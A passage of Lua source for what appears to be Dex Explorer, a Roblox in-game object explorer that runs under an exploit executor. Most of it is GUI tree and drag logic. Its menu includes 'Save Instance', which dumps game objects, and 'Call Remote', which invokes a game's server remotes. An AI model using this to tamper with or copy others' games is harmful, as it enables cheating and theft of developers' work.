					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				end)
				if CurrentSaveInstanceWindow then
					CurrentSaveInstanceWindow:Destroy()
					CurrentSaveInstanceWindow = nil
					if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
						explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
					end
				end
			end
		else
			ypcall(function()
				if SaveInstance then
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				else
					_G.SaveInstance(inst,filename.Text,not saveObjects)
				end
			end)
			if CurrentSaveInstanceWindow then
				CurrentSaveInstanceWindow:Destroy()
				CurrentSaveInstanceWindow = nil
				if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
					explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
				end
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentSaveInstanceWindow then
			CurrentSaveInstanceWindow:Destroy()
			CurrentSaveInstanceWindow = nil
			if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
				explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.SaveObjects.MouseButton1Up:connect(function()
		if saveObjects then
			saveObjects = false
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = false
		else
			saveObjects = true
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = true
		end
	end)
end

function DestroyRightClick()
	if currentRightClickMenu then
		currentRightClickMenu:Destroy()
		currentRightClickMenu = nil
	end
	if CurrentInsertObjectWindow and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Visible = false
	end
end

function rightClickMenu(sObj)
	local mouse = game.Players.LocalPlayer:GetMouse()
	
	currentRightClickMenu = CreateRightClickMenu(
		{"Cut","Copy","Paste Into","Duplicate","Delete","Group","Ungroup","Select Children","Teleport To","Insert Part","Insert Object","View Script","Save Instance","Call Function","Call Remote"},
		"",
		false,
		function(option)
			if option == "Cut" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				local cut = {}
				for i = 1,#list do
					local obj = list[i]:Clone()
					if obj then
						table.insert(clipboard,obj)
						table.insert(cut,list[i])
					end
				end
				for i = 1,#cut do
					pcall(delete,cut[i])
				end
				updateActions()
			elseif option == "Copy" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				for i = 1,#list do
					table.insert(clipboard,list[i]:Clone())
				end
				updateActions()
			elseif option == "Paste Into" then
				if not Option.Modifiable then return end
				local parent = Selection.List[1] or workspace
				for i = 1,#clipboard do
					clipboard[i]:Clone().Parent = parent
				end
			elseif option == "Duplicate" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					list[i]:Clone().Parent = Selection.List[1].Parent or workspace
				end
			elseif option == "Delete" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					pcall(delete,list[i])
				end
				Selection:Set({})
			elseif option == "Group" then
				if not Option.Modifiable then return end
				local newModel = Instance.new("Model")
				local list = Selection:Get()
				newModel.Parent = Selection.List[1].Parent or workspace
				for i = 1,#list do
					list[i].Parent = newModel
				end
				Selection:Set({})
			elseif option == "Ungroup" then
				if not Option.Modifiable then return end
				local ungrouped = {}
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("Model") then
						for i2,v2 in pairs(list[i]:GetChildren()) do
							v2.Parent = list[i].Parent or workspace
							table.insert(ungrouped,v2)
						end		
						pcall(delete,list[i])			
					end
				end
				Selection:Set({})
				if SettingsRemote:Invoke("SelectUngrouped") then
					for i,v in pairs(ungrouped) do
						Selection:Add(v)
					end
				end
			elseif option == "Select Children" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				Selection:Set({})
				Selection:StopUpdates()
				for i = 1,#list do
					for i2,v2 in pairs(list[i]:GetChildren()) do
						Selection:Add(v2)
					end
				end
				Selection:ResumeUpdates()
			elseif option == "Teleport To" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("BasePart") then
						pcall(function()
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = list[i].CFrame
						end)
						break
					end
				end
			elseif option == "Insert Part" then
				if not Option.Modifiable then return end
				local insertedParts = {}
				local list = Selection:Get()
				for i = 1,#list do
					pcall(function()
						local newPart = Instance.new("Part")
						newPart.Parent = list[i]
						newPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position) + Vector3.new(0,3,0)
						table.insert(insertedParts,newPart)
					end)
				end
			elseif option == "Save Instance" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				if #list == 1 then
					list[1].Archivable = true
					ypcall(function()PromptSaveInstance(list[1]:Clone())end)
				elseif #list > 1 then
					local newModel = Instance.new("Model")
					newModel.Name = "SavedInstances"
					for i = 1,#list do
						ypcall(function()
							list[i].Archivable = true
							list[i]:Clone().Parent = newModel
						end)
					end
					PromptSaveInstance(newModel)
				end
			elseif option == "Call Remote" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("RemoteFunction") or list[i]:IsA("RemoteEvent") then
						PromptRemoteCaller(list[i])
						break
					end
				end
			elseif option == "View Script" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("LocalScript") or list[i]:IsA("ModuleScript") then
						ScriptEditorEvent:Fire(list[i])
					end
				end
			end
	end)
	currentRightClickMenu.Parent = explorerPanel.Parent
	currentRightClickMenu.Position = UDim2.new(0,mouse.X,0,mouse.Y)
	if currentRightClickMenu.AbsolutePosition.X + currentRightClickMenu.AbsoluteSize.X > explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X then
		currentRightClickMenu.Position = UDim2.new(0, explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X - currentRightClickMenu.AbsoluteSize.X, 0, mouse.Y)
	end
end

local function cancelReparentDrag()end
local function cancelSelectDrag()end
do
	local listEntries = {}
	local nameConnLookup = {}

	local mouseDrag = Create('ImageButton',{
		Name = "MouseDrag";
		Position = UDim2.new(-0.25,0,-0.25,0);
		Size = UDim2.new(1.5,0,1.5,0);
		Transparency = 1;
		AutoButtonColor = false;
		Active = true;
		ZIndex = 10;
	})
	local function dragSelect(last,add,button)
		local connDrag
		local conUp

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local pos = Vector2.new(x,y) - listFrame.AbsolutePosition
			local size = listFrame.AbsoluteSize
			if pos.x < 0 or pos.x > size.x or pos.y < 0 or pos.y > size.y then return end

			local i = math.ceil(pos.y/ENTRY_BOUND) + scrollBar.ScrollIndex
			-- Mouse may have made a large step, so interpolate between the
			-- last index and the current.
			for n = i<last and i or last, i>last and i or last do
				local node = TreeList[n]
				if node then
					if add then
						Selection:Add(node.Object)
					else
						Selection:Remove(node.Object)
					end
				end
			end
			last = i
		end)

		function cancelSelectDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			function cancelSelectDrag()end
		end

		conUp = mouseDrag[button]:connect(cancelSelectDrag)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local function dragReparent(object,dragGhost,clickPos,ghostOffset)
		local connDrag
		local conUp
		local conUp2

		local parentIndex = nil
		local dragged = false

		local parentHighlight = Create('Frame',{
			Transparency = 1;
			Visible = false;
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(1,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,1,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
		})
		SetZIndex(parentHighlight,9)

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local dragPos = Vector2.new(x,y)
			if dragged then
				local pos = dragPos - listFrame.AbsolutePosition
				local size = listFrame.AbsoluteSize

				parentIndex = nil
				parentHighlight.Visible = false
				if pos.x >= 0 and pos.x <= size.x and pos.y >= 0 and pos.y <= size.y + ENTRY_SIZE*2 then
					local i = math.ceil(pos.y/ENTRY_BOUND-2)
					local node = TreeList[i + scrollBar.ScrollIndex]
					if node and node.Object ~= object and not object:IsAncestorOf(node.Object) then
						parentIndex = i
						local entry = listEntries[i]
						if entry then
							parentHighlight.Visible = true
							parentHighlight.Position = UDim2.new(0,1,0,entry.AbsolutePosition.y-listFrame.AbsolutePosition.y)
							parentHighlight.Size = UDim2.new(0,size.x-4,0,entry.AbsoluteSize.y)
						end
					end
				end

				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
			elseif (clickPos-dragPos).magnitude > 8 then
				dragged = true
				SetZIndex(dragGhost,9)
				dragGhost.IndentFrame.Transparency = 0.25
				dragGhost.IndentFrame.EntryText.TextColor3 = GuiColor.TextSelected
				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
				dragGhost.Parent = GetScreen(listFrame)
				parentHighlight.Parent = listFrame
			end
		end)

		function cancelReparentDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			conUp2:disconnect()
			dragGhost:Destroy()
			parentHighlight:Destroy()
			function cancelReparentDrag()end
		end

		local wasSelected = Selection.Selected[object]
		if not wasSelected and Option.Selectable then
			Selection:Set({object})
		end

		conUp = mouseDrag.MouseButton1Up:connect(function()
			cancelReparentDrag()
			if dragged then
				if parentIndex then
					local parentNode = TreeList[parentIndex + scrollBar.ScrollIndex]
					if parentNode then
						parentNode.Expanded = true

						local parentObj = parentNode.Object
						local function parent(a,b)
							a.Parent = b
						end
						if Option.Selectable then
							local list = Selection.List
							for i = 1,#list do
								pcall(parent,list[i],parentObj)
							end
						else
							pcall(parent,object,parentObj)
						end
					end
				end
			else
				-- do selection click
				if wasSelected and Option.Selectable then
					Selection:Set({})
				end
			end
		end)
		conUp2 = mouseDrag.MouseButton2Down:connect(function()
			cancelReparentDrag()
		end)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local entryTemplate = Create('ImageButton',{
		Name = "Entry";
		Transparency = 1;
		AutoButtonColor = false;
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,0,ENTRY_SIZE);
		Create('Frame',{
			Name = "IndentFrame";
			BackgroundTransparency = 1;
			BackgroundColor3 = GuiColor.Selected;
			BorderColor3 = GuiColor.BorderSelected;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,0,1,0);
			Create(Icon('ImageButton',0),{
				Name = "Expand";
				AutoButtonColor = false;
				Position = UDim2.new(0,-GUI_SIZE,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create(Icon(nil,0),{
				Name = "ExplorerIcon";
				Position = UDim2.new(0,2+ENTRY_PADDING,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create('TextLabel',{
				Name = "EntryText";
				BackgroundTransparency = 1;
				TextColor3 = GuiColor.Text;
				TextXAlignment = 'Left';
				TextYAlignment = 'Center';
				Font = FONT;
				FontSize = FONT_SIZE;
				Text = "";
				Position = UDim2.new(0,2+ENTRY_SIZE+4,0,0);
				Size = UDim2.new(1,-2,1,0);
			});
		});
	})

	function scrollBar.UpdateCallback(self)
		for i = 1,self.VisibleSpace do
			local node = TreeList[i + self.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if not entry then
					entry = Create(entryTemplate:Clone(),{
						Position = UDim2.new(0,2,0,ENTRY_BOUND*(i-1)+2);
						Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE);
						ZIndex = listFrame.ZIndex;
					})
					listEntries[i] = entry

					local expand = entry.IndentFrame.Expand
					expand.MouseEnter:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
								Icon(expand,NODE_EXPANDED_OVER)
							else
								Icon(expand,NODE_COLLAPSED_OVER)
							end
						end
					end)
					expand.MouseLeave:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
								Icon(expand,NODE_EXPANDED)
							else
								Icon(expand,NODE_COLLAPSED)
							end
						end
					end)
					expand.MouseButton1Down:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							node.Expanded = not node.Expanded
							if node.Object == explorerPanel.Parent and node.Expanded then
								CreateCaution("Warning","Please be careful when editing instances inside here, this is like the System32 of Dex and modifying objects here can break Dex.")
							end
							-- use raw update so the list updates instantly
							rawUpdateList()
						end
					end)

					entry.MouseButton1Down:connect(function(x,y)
						local node = TreeList[i + self.ScrollIndex]
						DestroyRightClick()
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not HoldingShift then
							lastSelectedNode = i + self.ScrollIndex
						end
						
						if HoldingShift and not filteringWorkspace() then
							if lastSelectedNode then
								if i + self.ScrollIndex - lastSelectedNode > 0 then
									Selection:StopUpdates()
									for i2 = 1, i + self.ScrollIndex - lastSelectedNode do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								else
									Selection:StopUpdates()
									for i2 = i + self.ScrollIndex - lastSelectedNode, 1 do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								end
							end
							return
						end
						
						if HoldingCtrl then
							if Selection.Selected[node.Object] then
								Selection:Remove(node.Object)
							else
								Selection:Add(node.Object)
							end
							return
						end
						if Option.Modifiable then
							local pos = Vector2.new(x,y)
							dragReparent(node.Object,entry:Clone(),pos,entry.AbsolutePosition-pos)
						elseif Option.Selectable then
							if Selection.Selected[node.Object] then
								Selection:Set({})
							else
								Selection:Set({node.Object})
							end
							dragSelect(i+self.ScrollIndex,true,'MouseButton1Up')
						end
					end)

					entry.MouseButton2Down:connect(function()
						if not Option.Selectable then return end
						
						DestroyRightClick()
						
						curSelect = entry
						
						local node = TreeList[i + self.ScrollIndex]
						
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not Selection.Selected[node.Object] then
							Selection:Set({node.Object})
						end
					end)
					
					
					entry.MouseButton2Up:connect(function()
						if not Option.Selectable then return end
						
						local node = TreeList[i + self.ScrollIndex]
						
						if checkMouseInGui(curSelect) then
							rightClickMenu(node.Object)
						end
					end)

					entry.Parent = listFrame
				end

				entry.Visible = true

				local object = node.Object

				-- update expand icon
				if #node == 0 then
					entry.IndentFrame.Expand.Visible = false
				elseif node.Expanded then
					Icon(entry.IndentFrame.Expand,NODE_EXPANDED)
					entry.IndentFrame.Expand.Visible = true
				else
					Icon(entry.IndentFrame.Expand,NODE_COLLAPSED)
					entry.IndentFrame.Expand.Visible = true
				end

				-- update explorer icon
				Icon(entry.IndentFrame.ExplorerIcon,ExplorerIndex[object.ClassName] or 0)

				-- update indentation
				local w = (node.Depth)*(2+ENTRY_PADDING+GUI_SIZE)
				entry.IndentFrame.Position = UDim2.new(0,w,0,0)
				entry.IndentFrame.Size = UDim2.new(1,-w,1,0)

				-- update name change detection
				if nameConnLookup[entry] then
					nameConnLookup[entry]:disconnect()
				end
				local text = entry.IndentFrame.EntryText
				text.Text = object.Name
				nameConnLookup[entry] = node.Object.Changed:connect(function(p)
					if p == 'Name' then
						text.Text = object.Name
					end
				end)

				-- update selection
				entry.IndentFrame.Transparency = node.Selected and 0 or 1
				text.TextColor3 = GuiColor[node.Selected and 'TextSelected' or 'Text']

				entry.Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE)
			elseif listEntries[i] then
				listEntries[i].Visible = false
			end
		end
		for i = self.VisibleSpace+1,self.TotalSpace do
			local entry = listEntries[i]
			if entry then
				listEntries[i] = nil
				entry:Destroy()
			end
		end
	end

	function scrollBarH.UpdateCallback(self)
		for i = 1,scrollBar.VisibleSpace do
			local node = TreeList[i + scrollBar.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if entry then
					entry.Position = UDim2.new(0,2 - scrollBarH.ScrollIndex,0,ENTRY_BOUND*(i-1)+2)
				end
			end
		end
	end

	Connect(listFrame.Changed,function(p)
		if p == 'AbsoluteSize' then
			rawUpdateSize()
		end
	end)

	local wheelAmount = 6
	explorerPanel.MouseWheelForward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end)
	explorerPanel.MouseWheelBackward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end)
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Object detection

-- Inserts `v` into `t` at `i`. Also sets `Index` field in `v`.
local function insert(t,i,v)
	for n = #t,i,-1 do
		local v = t[n]
		v.Index = n+1
		t[n+1] = v
	end
	v.Index = i
	t[i] = v
end

-- Removes `i` from `t`. Also sets `Index` field in removed value.
local function remove(t,i)
	local v = t[i]
	for n = i+1,#t do
		local v = t[n]
		v.Index = n-1
		t[n-1] = v
	end
	t[#t] = nil
	v.Index = 0
	return v
end

-- Returns how deep `o` is in the tree.
local function depth(o)
	local d = -1
	while o do
		o = o.Parent
		d = d + 1
	end
	return d
end


local connLookup = {}

-- Returns whether a node would be present in the tree list
local function nodeIsVisible(node)
	local visible = true
	node = node.Parent
	while node and visible do
		visible = visible and node.Expanded
		node = node.Parent
	end
	return visible
end

-- Removes an object's tree node. Called when the object stops existing in the
-- game tree.
local function removeObject(object)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	Selection:Remove(object,true)

	local parent = objectNode.Parent
	remove(parent,objectNode.Index)
	NodeLookup[object] = nil
	connLookup[object]:disconnect()
	connLookup[object] = nil

	if visible then
		updateList()
	elseif nodeIsVisible(parent) then
		updateScroll()
	end
end

-- Moves a tree node to a new parent. Called when an existing object's parent
-- changes.
local function moveObject(object,parent)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local parentNode = NodeLookup[parent]
	if not parentNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	remove(objectNode.Parent,objectNode.Index)
	objectNode.Parent = parentNode

	objectNode.Depth = depth(object)
	local function r(node,d)
		for i = 1,#node do
			node[i].Depth = d
			r(node[i],d+1)
		end
	end
	r(objectNode,objectNode.Depth+1)

	insert(parentNode,#parentNode+1,objectNode)

	if visible or nodeIsVisible(objectNode) then
		updateList()
	elseif nodeIsVisible(objectNode.Parent) then
		updateScroll()
	end
end

-- ScriptContext['/Libraries/LibraryRegistration/LibraryRegistration']
-- This RobloxLocked object lets me index its properties for some reason

local function check(object)
	return object.AncestryChanged
end

-- Creates a new tree node from an object. Called when an object starts
-- existing in the game tree.
local function addObject(object,noupdate)
	if script then
		-- protect against naughty RobloxLocked objects
		local s = pcall(check,object)
		if not s then
			return
		end
	end

	local parentNode = NodeLookup[object.Parent]
	if not parentNode then
		return
	end

	local objectNode = {
		Object = object;
		Parent = parentNode;
		Index = 0;
		Expanded = false;
		Selected = false;
		Depth = depth(object);
	}

	connLookup[object] = Connect(object.AncestryChanged,function(c,p)
		if c == object then
			if p == nil then
				removeObject(c)
			else
				moveObject(c,p)
			end
		end
	end)

	NodeLookup[object] = objectNode
	insert(parentNode,#parentNode+1,objectNode)

	if not noupdate then
		if nodeIsVisible(objectNode) then
			updateList()
		elseif nodeIsVisible(objectNode.Parent) then
			updateScroll()
		end
	end
end

local function makeObject(obj,par)
	local newObject = Instance.new(obj.ClassName)
	for i,v in pairs(obj.Properties) do
		ypcall(function()
			local newProp
			newProp = ToPropValue(v.Value,v.Type)
			newObject[v.Name] = newProp
		end)
	end
	newObject.Parent = par
end

local function writeObject(obj)
	local newObject = {ClassName = obj.ClassName, Properties = {}}
	for i,v in pairs(RbxApi.GetProperties(obj.className)) do
		if v["Name"] ~= "Parent" then
			print("thispassed")
			table.insert(newObject.Properties,{Name = v["Name"], Type = v["ValueType"], Value = tostring(obj[v["Name"]])})
		end
	end
	return newObject
end

local function buildDexStorage()
	local localDexStorage
	
	local success,err = ypcall(function()
		localDexStorage = game:GetObjects("rbxasset://DexStorage.rbxm")[1]
	end)
	
	if success and localDexStorage then
		for i,v in pairs(localDexStorage:GetChildren()) do
			ypcall(function()
				v.Parent = DexStorageMain
			end)
		end
	end
	
	updateDexStorageListeners()
	--[[
	local localDexStorage = readfile(getelysianpath().."DexStorage.txt")--game:GetService("CookiesService"):GetCookieValue("DexStorage")
	--local success,err = pcall(function()
		if localDexStorage then
			local objTable = game:GetService("HttpService"):JSONDecode(localDexStorage)
			for i,v in pairs(objTable) do
				makeObject(v,DexStorageMain)
			end
		end
	--end)
	--]]
end

local dexStorageDebounce = false
local dexStorageListeners = {}

local function updateDexStorage()
	if dexStorageDebounce then return end
	dexStorageDebounce = true	
	
	wait()
	
	pcall(function()
		saveinstance("content//DexStorage.rbxm",DexStorageMain)
	end)
	
	updateDexStorageListeners()
	
	dexStorageDebounce = false
	--[[
	local success,err = ypcall(function()
		local objs = {}
		for i,v in pairs(DexStorageMain:GetChildren()) do
			table.insert(objs,writeObject(v))
		end
		writefile(getelysianpath().."DexStorage.txt",game:GetService("HttpService"):JSONEncode(objs))
		--game:GetService("CookiesService"):SetCookieValue("DexStorage",game:GetService("HttpService"):JSONEncode(objs))
	end)
	if err then
		CreateCaution("DexStorage Save Fail!","DexStorage broke! If you see this message, report to Raspberry Pi!")
	end
	print("hi")
	--]]
end

function updateDexStorageListeners()
	for i,v in pairs(dexStorageListeners) do
		v:Disconnect()
	end
	dexStorageListeners = {}
	for i,v in pairs(DexStorageMain:GetChildren()) do
		pcall(function()
			local ev = v.Changed:connect(updateDexStorage)
			table.insert(dexStorageListeners,ev)
		end)
	end
end

do
	NodeLookup[workspace.Parent] = {
		Object = workspace.Parent;
		Parent = nil;
		Index = 0;
		Expanded = true;
	}
	
	if DexStorageEnabled then
		NodeLookup[DexStorage] = {
			Object = DexStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end
	
	if NilStorageEnabled then
		NodeLookup[NilStorage] = {
			Object = NilStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end

	Connect(game.DescendantAdded,addObject)
	Connect(game.DescendantRemoving,removeObject)
	
	if DexStorageEnabled then
		--[[
		if readfile(getelysianpath().."DexStorage.txt") == nil then
			writefile(getelysianpath().."DexStorage.txt","")
		end
		--]]
		
		buildDexStorage()
	
		Connect(DexStorage.DescendantAdded,addObject)
		Connect(DexStorage.DescendantRemoving,removeObject)
	
		Connect(DexStorage.DescendantAdded,updateDexStorage)
		Connect(DexStorage.DescendantRemoving,updateDexStorage)
	end
	
	if NilStorageEnabled then
		Connect(NilStorage.DescendantAdded,addObject)
		Connect(NilStorage.DescendantRemoving,removeObject)		
		
		local currentTable = get_nil_instances()	
		
		spawn(function()
			while wait() do
				if #currentTable ~= #get_nil_instances() then
					currentTable = get_nil_instances()
					--NilStorageMain:ClearAllChildren()
					for i,v in pairs(get_nil_instances()) do
						if v ~= NilStorage and v ~= DexStorage then
							pcall(function()
								v.Parent = NilStorageMain
							end)
							--[[
							local newNil = v
							newNil.Archivable = true
							newNil:Clone().Parent = NilStorageMain
							--]]
						end
					end
				end
			end
		end)
	end

	local function get(o)
		return o:GetChildren()
	end

	local function r(o)
		local s,children = pcall(get,o)
		if s then
			for i = 1,#children do
				addObject(children[i],true)
				r(children[i])
			end
		end
	end

	r(workspace.Parent)
	if DexStorageEnabled then
		r(DexStorage)
	end
	if NilStorageEnabled then
		r(NilStorage)
	end

	scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
	updateList()
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Actions

local actionButtons do
	actionButtons = {}

	local totalActions = 1
	local currentActions = totalActions
	local function makeButton(icon,over,name,vis,cond)
		local buttonEnabled = false
		
		local button = Create(Icon('ImageButton',icon),{
			Name = name .. "Button";
			Visible = Option.Modifiable and Option.Selectable;
			Position = UDim2.new(1,-(GUI_SIZE+2)*currentActions+2,0.25,-GUI_SIZE/2);
			Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			Parent = headerFrame;
		})

		local tipText = Create('TextLabel',{
			Name = name .. "Text";
			Text = name;
			Visible = false;
			BackgroundTransparency = 1;
			TextXAlignment = 'Right';
			Font = FONT;
			FontSize = FONT_SIZE;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,-(GUI_SIZE+2)*totalActions,1,0);
			Parent = headerFrame;
		})

		
		button.MouseEnter:connect(function()
			if buttonEnabled then
				button.BackgroundTransparency = 0.9
			end
			--Icon(button,over)
			--tipText.Visible = true
		end)
		button.MouseLeave:connect(function()
			button.BackgroundTransparency = 1
			--Icon(button,icon)
			--tipText.Visible = false
		end)

		currentActions = currentActions + 1
		actionButtons[#actionButtons+1] = {Obj = button,Cond = cond}
		QuickButtons[#actionButtons+1] = {Obj = button,Cond = cond, Toggle = function(on)
			if on then
				buttonEnabled = true
				Icon(button,over)
			else
				buttonEnabled = false
				Icon(button,icon)
			end
		end}
		return button
	end

	--local clipboard = {}
	local function delete(o)
		o.Parent = nil
	end
	
	makeButton(ACTION_EDITQUICKACCESS,ACTION_EDITQUICKACCESS,"Options",true,function()return true end).MouseButton1Click:connect(function()
		
	end)
	

	-- DELETE
	makeButton(ACTION_DELETE,ACTION_DELETE_OVER,"Delete",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local list = Selection:Get()
		for i = 1,#list do
			pcall(delete,list[i])
		end
		Selection:Set({})
	end)
	
	-- PASTE
	makeButton(ACTION_PASTE,ACTION_PASTE_OVER,"Paste",true,function() return #Selection:Get() > 0 and #clipboard > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local parent = Selection.List[1] or workspace
		for i = 1,#clipboard do
			clipboard[i]:Clone().Parent = parent
		end
	end)
	
	-- COPY
	makeButton(ACTION_COPY,ACTION_COPY_OVER,"Copy",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		for i = 1,#list do
			table.insert(clipboard,list[i]:Clone())
		end
		updateActions()
	end)
	
	-- CUT
	makeButton(ACTION_CUT,ACTION_CUT_OVER,"Cut",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		local cut = {}
		for i = 1,#list do
			local obj = list[i]:Clone()
			if obj then
				table.insert(clipboard,obj)
				table.insert(cut,list[i])
			end
		end
		for i = 1,#cut do
			pcall(delete,cut[i])
		end
		updateActions()
	end)
	
	-- FREEZE
	makeButton(ACTION_FREEZE,ACTION_FREEZE,"Freeze",true,function() return true end)
	
	-- ADD/REMOVE STARRED
	makeButton(ACTION_ADDSTAR,ACTION_ADDSTAR_OVER,"Star",true,function() return #Selection:Get() > 0 end)
	
	-- STARRED
	makeButton(ACTION_STARRED,ACTION_STARRED,"Starred",true,function() return true end)


	-- SORT
	-- local actionSort = makeButton(ACTION_SORT,ACTION_SORT_OVER,"Sort")
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Option Bindables

do
	local optionCallback = {
		Modifiable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Selectable
			end
			cancelReparentDrag()
		end;
		Selectable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Modifiable
			end
			cancelSelectDrag()
			Selection:Set({})
		end;
	}

	local bindSetOption = explorerPanel:FindFirstChild("SetOption")
	if not bindSetOption then
		bindSetOption = Create('BindableFunction',{Name = "SetOption"})
		bindSetOption.Parent = explorerPanel
	end

	bindSetOption.OnInvoke = function(optionName,value)
		if optionCallback[optionName] then
			Option[optionName] = value
			optionCallback[optionName](value)
		end
	end

	local bindGetOption = explorerPanel:FindFirstChild("GetOption")
	if not bindGetOption then
		bindGetOption = Create('BindableFunction',{Name = "GetOption"})
		bindGetOption.Parent = explorerPanel
	end

	bindGetOption.OnInvoke = function(optionName)
		if optionName then
			return Option[optionName]
		else
			local options = {}
			for k,v in pairs(Option) do
				options[k] = v
			end
			return options
		end
	end
end

function SelectionVar()
	return Selection
end

Input.InputBegan:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = true
	end
	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = true
	end
end)

Input.InputEnded:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = false
	end
